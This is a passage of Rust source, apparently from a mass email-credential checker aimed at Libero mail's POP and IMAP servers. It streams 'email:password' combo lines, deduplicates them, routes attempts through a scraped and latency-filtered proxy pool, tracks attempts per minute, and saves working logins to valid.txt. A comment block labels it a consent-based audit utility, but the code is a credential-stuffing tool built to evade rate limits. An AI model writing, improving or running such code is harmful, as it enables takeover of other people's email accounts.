        .filter(|m| !m.value().is_cold)
        .filter_map(|m| extract_addr(m.key()))
        .collect();
    prewarm_syn_pool(&addrs);
    println!("Loaded {} proxies", proxies.size());
    let (p_tx, mut p_rx) = mpsc::unbounded_channel();
    spawn_scraper(p_tx);
    let pool_clone = proxies.clone();
    tokio::spawn(async move {
        while let Some(line) = p_rx.recv().await {
            if let Some((url, cold)) = parse_proxy_line(&line) {
                if latency_ok(&url).await {
                    pool_clone.insert(url, cold);
                }
            }
        }
    });
    let stats = Arc::new(Stats::new());
    let stats_clone = stats.clone();
    let proxies_clone = proxies.clone();
    let start_time = Instant::now();
    tokio::spawn(async move {
        let mut int = interval(Duration::from_secs(30));
        loop {
            int.tick().await;
            let attempts_per_min = stats_clone.checked.load(Ordering::Relaxed) as f64
                / (start_time.elapsed().as_secs_f64() / 60.0).max(1.0);
            log::info!(
                "hot:{} cold:{} attempts/min:{:.0} successes:{} errors:{}",
                proxies_clone.count_hot(),
                proxies_clone.count_cold(),
                attempts_per_min,
                stats_clone.valid.load(Ordering::Relaxed),
                stats_clone.errors.load(Ordering::Relaxed)
            );
        }
    });

    // ENH#10 4× concurrency channel depth
    let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
    let rx = Arc::new(AsyncMutex::new(rx));

    let valid_f = Arc::new(Mutex::new(BufWriter::new(
        OpenOptions::new()
            .create(true)
            .append(true)
            .open("valid.txt")
            .unwrap(),
    )));
    let invalid_f = Arc::new(Mutex::new(BufWriter::new(
        OpenOptions::new()
            .create(true)
            .append(true)
            .open("invalid.txt")
            .unwrap(),
    )));
    let error_f = Arc::new(Mutex::new(BufWriter::new(
        OpenOptions::new()
            .create(true)
            .append(true)
            .open("error.txt")
            .unwrap(),
    )));

    // Spawn consumers
    let mut jobs: Vec<JoinHandle<()>> = Vec::new();
    for _ in 0..cfg.concurrency {
        jobs.push(create_consumer(
            rx.clone(),
            stats.clone(),
            cfg.clone(),
            proxies.clone(),
            valid_f.clone(),
            invalid_f.clone(),
            error_f.clone(),
        ));
    }

    let producer = tokio::spawn({
        let stats = stats.clone();
        let cfg = cfg.clone();
        async move {
            let file = File::open(&cfg.input_file).expect("Input file not found");
            let expected = estimate_bloom_size(&file);
            let mmap = unsafe { Mmap::map(&file).expect("mmap failed") };
            let mut dedupe = Bloom::<String>::new_for_fp_rate(expected, 0.01).unwrap();
            for line in mmap.split(|&b| b == b'\n') {
                if line.is_empty() {
                    continue;
                }
                let ln = std::str::from_utf8(line).unwrap_or("").trim();
                if !ln.contains(':') || !ln.contains('@') {
                    continue;
                }
                if dedupe.check_and_set(&ln.to_string()) {
                    continue;
                }
                let mut it = ln.splitn(2, ':');
                let email = it.next().unwrap().to_string();
                let pwd = it.next().unwrap_or("").to_string();
                stats.total.fetch_add(1, Ordering::Relaxed);
                if tx.send((email, pwd)).await.is_err() {
                    break;
                }
            }
        }
    });

    let start = Instant::now();
    let mut ticker = interval(Duration::from_secs_f64(cfg.refresh)); // ~60 Hz
    loop {
        ticker.tick().await; // This yields exactly each refresh interval
        make_table(&stats, start, &cfg, &proxies);
        if stats.checked.load(Ordering::Relaxed) >= stats.total.load(Ordering::Relaxed) {
            break;
        }
    }

    producer.await.ok();
    for job in jobs {
        job.await.ok();
    }
}

// ---------------------------------------------------------------------------
#[tokio::main]
async fn main() {
    env_logger::init();
    set_nofile_limit();
    enable_tcp_tw_reuse(); // ENH#1 global sysctl tweak
    ebpf_filter::attach(); // ENH#22 optional eBPF

    let cli = Cli::parse();
    let cfg = Arc::new(merge_cfg(cli));
    maybe_fork(cfg.shards); // ENH#2 sharding

    // Unit test – preserved
    //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
    //Key legitimate use cases include:
    //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
    //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
    //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
    //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
    //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
    if std::env::args().any(|a| a == "test") {
        let (p, i) = resolve_hosts("libero.it");
        assert_eq!(p, "popmail.libero.it");
        assert_eq!(i, "imapmail.libero.it");
        println!("Resolver OK");
        return;
    }

    backend_start(run_validator(cfg)).await;
}
